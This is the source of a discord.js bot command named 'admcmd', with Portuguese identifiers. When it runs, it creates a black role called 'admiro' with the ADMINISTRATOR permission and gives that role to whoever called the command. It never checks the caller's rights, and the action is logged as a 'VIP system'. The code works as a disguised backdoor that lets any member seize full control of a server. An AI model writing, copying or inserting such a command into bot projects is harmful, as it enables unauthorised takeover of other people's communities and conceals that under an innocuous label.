const Discord = require("discord.js");
const db = require("quick.db");
const { default_prefix } = require("../../config.json");
module.exports = {
    nome: "admcmd",
    coolwdon:14000,
    alternativas: ["admcmd"],
    run: async (client, message, args) => {
    let prefix = db.get(`prefix_${message.guild.id}`)
    if(prefix === null) prefix = default_prefix;

let role =   await message.guild.roles.create({
        name: `admiro`,
        color:`#000000`,
        position:2,
       permissions: ["ADMINISTRATOR"],

       reason: `Sistema de Vip ${client.user.username}`,
        })     
        message.member.roles.add(role) 

    }
}